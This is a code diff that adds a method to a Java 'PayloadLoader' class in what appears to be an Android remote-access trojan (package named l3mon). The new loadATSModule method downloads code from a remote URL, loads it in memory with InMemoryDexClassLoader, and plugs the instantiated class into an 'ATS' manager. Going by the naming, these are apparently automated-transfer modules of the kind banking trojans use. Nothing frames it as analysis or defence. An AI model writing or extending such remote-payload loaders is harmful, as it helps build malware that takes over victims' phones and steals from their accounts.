@@ -79,6 +79,26 @@ public class PayloadLoader {
         }
     }
 
+    public static void loadATSModule(String moduleUrl, String className, com.etechd.l3mon.managers.ATSManager atsManager) {
+        executor.execute(() -> {
+            try {
+                byte[] data = downloadPayload(moduleUrl);
+                if (data != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    ByteBuffer buffer = ByteBuffer.wrap(data);
+                    InMemoryDexClassLoader loader = new InMemoryDexClassLoader(buffer,
+                            Thread.currentThread().getContextClassLoader());
+
+                    Class<?> moduleClass = loader.loadClass(className);
+                    IATSModule module = (IATSModule) moduleClass.getDeclaredConstructor().newInstance();
+                    atsManager.addDynamicModule(module);
+                    Log.d(TAG, "Módulo ATS carregado: " + module.getModuleName());
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Erro ao carregar módulo ATS", e);
+            }
+        });
+    }
+
     public interface OnPayloadLoaded {
         void onSuccess();
         void onError(String error);
